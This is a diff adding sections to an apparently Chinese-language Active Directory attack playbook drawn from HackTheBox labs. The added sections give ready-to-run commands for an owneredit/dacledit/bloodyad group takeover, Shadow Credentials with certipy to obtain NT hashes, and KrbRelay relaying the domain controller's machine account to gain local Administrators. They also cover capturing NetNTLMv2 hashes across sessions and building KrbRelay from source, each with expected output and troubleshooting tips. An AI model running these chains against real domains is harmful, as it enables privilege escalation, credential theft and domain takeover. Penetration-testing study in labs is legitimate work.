@@ -24,6 +24,16 @@ Step 5 服务密文（Jenkins / VNC 注册表 / ERRORLOG / pfx）→ §7 离线�
 
 分界：本文件只讲**域内**横向与域提权；shell 之后的**本机提权**见 `references/notes/privesc-linux-windows.md`。
 
+### 0.1 Kerberos-only 域的通用纪律（HTB-Absolute 实测踩坑后固化）
+
+1. **PAC 时序**：**组员身份**在 **TGT 签发时**写进 PAC，所以**改完组员必须重新取票**，否则出现"AD 里明明入组成功了、操作仍被拒"——典型是写 `msDS-KeyCredentialLink` 报 `INSUFF_ACCESS_RIGHTS`（该权限由新组的 ACE 授予），或已加入 `Administrators` 但登录令牌里没有管理员组。
+   ⚠️ **反例边界**：改的是**对象侧 ACL/DACL**（给别人或自己补 ACE）时**不需要**换票——授权判定看对象 DACL，不看你的 PAC。本案实证：`dacledit` 自补 `FullControl` 后，`bloodyad` 用**入组前签发的旧票**就成功写入了组成员。
+   **判据：任何"权限已改却报权限不足"的现象，先分清"改的是我的身份（换票）还是对象的 ACL（不用换票）"。**
+2. **一次跑完**：目标可能存在**周期性状态还原**（实测被重置的是**组员身份与 owner**：11:55 验证 `m.lovegod` 已在组内，12:05 之前复查已消失且读不出 SD，**窗口 ≤10 分钟**；DACL 是否同步回滚未直接观测，按"一并失效"处理即可）。带状态变更的链（owneredit → dacledit → 入组 → 重新取票 → Shadow Credentials）要**单次连续执行**——实测 37 秒连跑 5 步全绿，中途停顿则前功尽弃，且报错与"本来就没权限"无法区分。
+3. **BH 边可能过期**：`Owns` 边只是采集时刻的 owner 字段。动手前读目标的 `nTSecurityDescriptor` 实锤——**在已正确请求该属性的前提下读不到它 = 当前不是 owner**（owner 隐含 `READ_CONTROL`；反向不成立：非 owner 也可能被显式授予 `READ_CONTROL` 而读到）。
+4. **工具命名（Kali 打包版）**：`impacket-<name>`（没有裸 `*.py`）、`certipy-ad`（不是 `certipy`）、`bloodyad`（全小写，不是 `bloodyAD`）。名字写错会浪费一轮实验。
+5. **NTLM 报错三态判读**：`STATUS_LOGON_FAILURE` = 凭据错或该域 NTLM 全禁；`STATUS_ACCOUNT_RESTRICTION` = **密码已验证正确**、仅登录方式被策略拦（Protected Users）；用 NT hash 取票报 `KDC_ERR_ETYPE_NOSUPP` = 账号在 Protected Users / 仅允许 AES，改用 ccache 或 pfx，别再拿 hash 试。
+
 ## 1. 立足后侦察（BloodHound + AD 回收站）
 
 ### 1.1 采集
@@ -51,6 +61,9 @@ download 20260505210432_SharpHound.zip
 | GenericAll over 用户 | 直接改密 | §3.3 |
 | GenericWrite over DC/机器账号 | RBCD 三连 | §3.6 |
 | DCSync 边 | impacket-secretsdump -just-dc | §3.2 |
+| Owns / GenericWrite over 组（BH 显示但写操作被拒） | owneredit → dacledit → bloodyAD 入组（Linux 侧） | §3.7 |
+| GenericWrite / AddKeyCredentialLink over 用户 | Shadow Credentials（certipy shadow auto，免爆破拿身份+NT hash） | §3.8 |
+| 已上 WinRM 但非管理员，且 LDAP signing 未启用 | KrbRelay 中继机器账户 → 入 Administrators | §5.5 |
 
 决策点：**一条边也够用**（Blackfield 仅 ForceChangePassword 一条边即改密拿到 forensic 共享读权）；**BloodHound 无路径≠无漏洞**——回落 PowerView `Get-DomainObjectAcl` 手查（Self/WriteProperty 类边 GUI 不一定标出），或 grep 离线 acls.csv（§3.0）。
 
@@ -233,6 +246,60 @@ impacket-wmiexec -k -no-pass -target-ip 10.129.23.95 dc.support.htb
 ```
 来源：HTB-Support。要点：新建机器账号 PWN$ 当"委派来源"，对 DC$ 写 msDS-AllowedToActOnBehalfOfOtherIdentity，再以 PWN$ 身份冒充 Administrator 取 cifs 票据，最后 `wmiexec -k -no-pass` 直达 DC。
 
+### 3.7 ACL 接管链：owneredit → dacledit → bloodyAD（BH 边过期时的 Linux 侧实测路径）
+
+**触发**：BH 显示 `A → Owns → 组`，但写操作被拒（`insufficientAccessRights`）。先实锤 owner（只读；判据见 §0.1 第 3 条）：
+
+```bash
+ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b 'DC=absolute,DC=htb' -LLL \
+  '(cn=Network Audit)' nTSecurityDescriptor member
+```
+
+三步接管并入组（每步都在改域状态，按 §0.1 第 2 条一次跑完）：
+
+```bash
+impacket-owneredit -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb \
+  -new-owner m.lovegod -target 'Network Audit' -action write
+impacket-dacledit -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb \
+  -principal m.lovegod -target 'Network Audit' -action write -rights FullControl
+bloodyad --host dc.absolute.htb -d absolute.htb -k add groupMember 'Network Audit' m.lovegod
+impacket-getTGT 'absolute.htb/m.lovegod:<口令>' -dc-ip 10.129.232.60   # 入组后必须重取票
+```
+
+来源：HTB-Absolute（执行顺序与官方 writeup 一致）
+
+- **为什么 owneredit 必须在前**：owner 身份隐含 `READ_CONTROL` + `WRITE_DAC`，但**不直接给"写 member 属性"的权**；dacledit 先给自己补 `FullControl`，bloodyAD 才有权改 `member`。省掉这两步直接入组 = `insufficientAccessRights`。
+- **实现细节（源码核对：impacket 0.14.0.dev0 `examples/dacledit.py`）**：`FullControl` 掩码定义为 `0xf01ff`（`SIMPLE_PERMISSIONS.FullControl`），写入方式是读出目标 `nTSecurityDescriptor`、追加 ACE 后以 LDAP `MODIFY_REPLACE` 整体写回——**所以 dacledit 自己也需要 `READ_CONTROL`**（与 §0.1 第 3 条同源）。
+- 取值以 `-h` 为准（已核对）：`-action {read,write,remove,backup,restore}`、`-rights {FullControl,ResetPassword,WriteMembers,DCSync,Custom}`（默认 `FullControl`）。
+- **回滚**：`write` / `remove` / `restore` 前都会自动生成 `dacledit-<YYYYmmdd-HHMMSS>.bak`（JSON，含原 SD 的 hex 与目标 DN），回滚执行：
+```bash
+impacket-dacledit -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb -action restore -file dacledit-<ts>.bak
+```
+- `-principal` 是**被授权方**，`absolute.htb/<user>` 是**认证身份**，是两个不同的参数位（自授权时同名，容易误读）。
+- 与 §3.3 分工：§3.3 是 Windows/PowerView 三连，本节是 Linux/impacket + bloodyAD——同一目标的两种打法。
+
+### 3.8 Shadow Credentials（msDS-KeyCredentialLink）
+
+**原理**：向目标账号的 `msDS-KeyCredentialLink` 写入攻击者公钥 → KDC 接受 PKINIT（证书）认证 → 以该账号身份取 TGT → 解 PAC 得 NT hash（UnPAC the hash）。**不需要口令、不需要爆破**，一步拿到身份。 `auto` 模式的执行顺序由源码写死（certipy 5.0.4 `commands/shadow.py` docstring：add a Key Credential → authenticate → get NT hash → **restore original state**），并在结束时**恢复写入前的原始值**。
+
+**前提**：对该属性有写权（`GenericWrite` / `AddKeyCredentialLink` / `GenericAll`）；域支持 PKINIT（有 ADCS / KDC 证书）。
+
+```bash
+certipy-ad shadow auto -k -no-pass -u 'absolute.htb/m.lovegod@dc.absolute.htb' \
+  -dc-ip 10.129.232.60 -dc-host dc.absolute.htb -target dc.absolute.htb -account winrm_user
+# 成功：写入 Key Credential → PKINIT 取 TGT → 输出 <account>.ccache + NT hash
+# 结尾自动恢复写入前的原始 Key Credentials（源码流程保证；输出 Successfully restored）
+```
+
+来源：HTB-Absolute
+
+- `-u` = **认证身份**（当前持有的账号），`-account` = **被接管账号**，必须区分。
+- Kerberos 认证时显式加 `-dc-host <DC 主机名>`，否则告警 `DC host (-dc-host) not specified and Kerberos authentication is used. This might fail`。
+- 目标 ccache 已存在时会**交互询问是否覆盖** → 脚本/管道环境先 `rm -f <account>.ccache`，否则卡死。
+- 失败 `00002098 INSUFF_ACCESS_RIGHTS` = PAC 未更新或 ACL 已被还原（§0.1 第 1、2 条）；**失败那次的 KeyCredential 未写入 AD**，直接重跑不留脏。
+- **PKINIT 不受 Protected Users 限制**：本案 `winrm_user` 在 Protected Users（禁 NTLM、禁 RC4），该攻击照样成功（实测）——不要因为目标在 Protected Users 组就排除这条路。
+- 检测视角：`msDS-KeyCredentialLink` 的写入在 5136（目录服务变更）里是强特征（标准 AD 审计事件，本档未实测）；且因结尾自动还原，事后回溯困难。
+
 ## 4. ADCS 证书攻击（ESC1）
 
 四步链（来源：HTB-Escape 全链）：
@@ -309,6 +376,59 @@ echo "95ACA8C7248774CB:1122334455667788">>14000.hash
 echo "427E1AE5B8D5CE68:1122334455667788">>14000.hash
 hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1
 ```
+
+### 5.5 KrbRelay：中继机器账户到 LDAP → 入 Administrators（WinRM 非交互会话专用）
+
+**场景**：已拿到 WinRM 登录（Remote Management Users）但**不是管理员**，且域控的 `Domain controller: LDAP server signing requirements` 未设为 Require（旧版默认安装即如此；微软近年逐步推进默认强制签名）。**判定方式**：走一次中继即可知——设为 Require 时中继发起的 LDAP bind 会被直接拒绝，**走不到输出里的 `[+] LDAP session established`**（本档未附策略查询命令，以实测症状为准）。
+
+```powershell
+cd C:\programdata\Apps   # 会话起始目录通常是 C:\Users\<user>\Documents，不切目录 .\Tool.exe 会 not recognized
+.\CheckPort.exe          # 找防火墙允许 SYSTEM 使用的端口（HTB-Absolute 实测返回 10）
+
+.\RunasCs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 "C:\programdata\Apps\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user"
+# 成功标志：[*] Relaying context: absolute.htb\DC$ → [+] LDAP session established → [*] ldap_modify: LDAP_SUCCESS
+net localgroup administrators     # 成员出现 winrm_user 即成功
+```
+
+来源：HTB-Absolute
+
+- **必须经 RunasCs 启动**：WinRM（PS remoting）会话不是交互会话、内存里没有用户凭据，**官方 writeup 中直接运行 KrbRelay 报 `Access Denied`**（本案按官方姿势直接用 RunasCs，未复现裸跑失败）。
+- `-l 9` 是 **logon type 9**（≈ `runas /netonly`，**不校验口令**，所以可填假口令），**不是 session id**；KrbRelay 侧的 `-session <id>` 才是跨会话编组参数。
+- **`-add-groupmember <GROUP> <USER>` 必须显式写出**：官方 writeup 正文未体现该参数，但 `KrbRelay.exe -h` 实测列出该子命令（同族还有 `-shadowcred` / `-rbcd` / `-reset-password` / `-console` / `-laps` / `-gMSA`）。
+- 加完组**必须重新取票**，否则登录令牌里仍没有管理员组（§0.1 第 1 条）。
+- CLSID 用 TrustedInstaller 的 `8F5DF053-3013-4dd8-B5F4-88214E81C0CF`（该 Windows 版本实测可用）；端口取 CheckPort 输出。
+- **为什么能成功**：中继到的身份是**域控自身的机器账户**（成功输出里那行 `Relaying context: absolute.htb\DC$`），它在域内权限极高，所以随后的 LDAP 修改（把当前用户写进 `Administrators`）被允许——这也是该路径无需任何 ACL 边的原因。
+
+**另一种用法——跨会话抓 NTLM**（来源：HTB-Rebound 博客原文）：目标存在交互会话时（`Get-Process` 的 SI 列 = 1，如 explorer/ctfmon），用 `-ntlm -session <id>` 让指定会话内的用户发起认证，抓其 NetNTLMv2 离线破解：
+
+```powershell
+.\RunasCs.exe oorend '<口令>' -l 9 "c:\programdata\apps\KrbRelay.exe -ntlm -session 1 -clsid 38e441fb-3d16-422f-8750-b2dacec5cefc -port 95"
+# 输出 NTLM3 <user>::<domain>:... 即 NetNTLMv2 → hashcat -m 5600
+```
+
+**工具自建（本机实测配方）**：官方仓库**未提供可直接下载的编译产物**（本次探测：`/releases` 页面无任何下载项、`bin/Release/*.exe` 均 404；官方 writeup 亦是在 Windows 上用 VS 自行编译），Linux 侧从源码编译可行：
+
+```bash
+git clone --depth 1 https://github.com/cube0x0/KrbRelay /tmp/krs
+# 仓库自带 packages/（BouncyCastle 1.8.9、MimeKitLite 2.15.1、System.Buffers 4.5.1、ILMerge），第三方依赖无需从 NuGet 拉取
+# 注意：net472 目标包 Microsoft.NETFramework.ReferenceAssemblies 仍需联网 restore 一次
+```
+
+用 SDK 风格工程以 `TargetFramework=net472` 编译（`<Compile>` / `<EmbeddedResource>` 列表直接取自原 `KrbRelay.csproj`），五个必配点（标 ※ 的两项为**预防性设置**，未实测报错）：
+
+| 坑 | 现象 | 解法 |
+|---|---|---|
+| 缺框架引用 | `System.Net.Http` / `System.DirectoryServices` 命名空间不存在 | 显式加 `System.Net.Http`、`System.DirectoryServices`、`System.Numerics`、`System.Data`、`Microsoft.CSharp` |
+| HintPath 相对路径 | MimeKit / NetFwTypeLib 引用静默失效 | 引用一律写**绝对路径**（相对路径按 csproj 所在目录解析） |
+| MimeKitLite 目标框架 | `MSB3274`：net48 版高于目标 net472 | 改用该包 `lib/netstandard2.0` 那份 DLL |
+| ※ COM 引用 | 原工程 `<COMReference Include="NetFwTypeLib">` 在 Linux 上无法解析 | 改用仓库内现成的 `CheckPort/obj/Release/Interop.NetFwTypeLib.dll` 作普通引用 |
+| ※ 程序集属性 / dotnet HOME | 预防项：AssemblyInfo 重复定义；实测报 `The user's home directory could not be determined` | `GenerateAssemblyInfo=false` + `EnableDefaultCompileItems=false`；`export DOTNET_CLI_HOME=/tmp/dnhome HOME=/tmp/dnhome` |
+
+```bash
+dotnet build KrbRelay.csproj -c Release   # 产出 KrbRelay.exe(≈662KB) + CheckPort.exe(≈6.6KB)
+```
+
+产物目录必须同时带上 4 个运行时依赖：`BouncyCastle.Crypto.dll`、`MimeKitLite.dll`、`System.Buffers.dll`、`Interop.NetFwTypeLib.dll`——**缺任一个即 `FileNotFoundException`**（CheckPort 最先报缺 `Interop.NetFwTypeLib`）。
 
 ## 6. 域内隧道与受限出口
 
